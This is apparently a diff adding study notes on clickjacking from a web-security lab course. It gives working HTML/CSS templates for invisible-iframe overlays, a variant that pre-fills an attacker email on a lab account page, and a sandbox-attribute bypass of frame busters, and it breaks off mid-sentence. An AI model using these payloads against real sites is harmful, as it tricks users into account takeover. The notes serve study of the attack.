@@ -1,0 +1,73 @@
+Clickjacking (UI redressing)
+
+
+The attacker will create a decoy website with an invisible button(iframe).
+
+
+--------------------------------Basic Clickjacking
+
+Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe 
+layer overlaid on the decoy website. An example using the style tag and parameters is as follows: 
+
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:128px;
+			height:128px;
+			opacity:0.00001;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:300px;
+			height:400px;
+			z-index:1;
+			}
+	</style>
+</head>
+...
+<body>
+	<div id="decoy_website">
+	...decoy web content here...
+	</div>
+	<iframe id="target_website" src="https://vulnerable-website.com">
+	</iframe>
+</body>
+
+AND (Prefilled Input)
+
+<style>
+    iframe {
+        position:relative;
+        width:700px;
+        height: 700px;
+        opacity: 0.00001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:450px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe src="https://0ac800ea04a20f168125ded4006300fa.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+
+--------------------------------------Bypass
+
+There are some techniques to avoid clickjacking:
+
+check and enforce that the current application window is the main or top window,
+make all frames visible,
+prevent clicking on invisible frames,
+intercept and flag potential clickjacking attacks to the user.
+
+An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts 
+values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
+
+<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
+----------------------------------------XSS with clickjacking
+
+If a website is vulnerable to xss you can use XSS to inject an XSS with the submit of the user
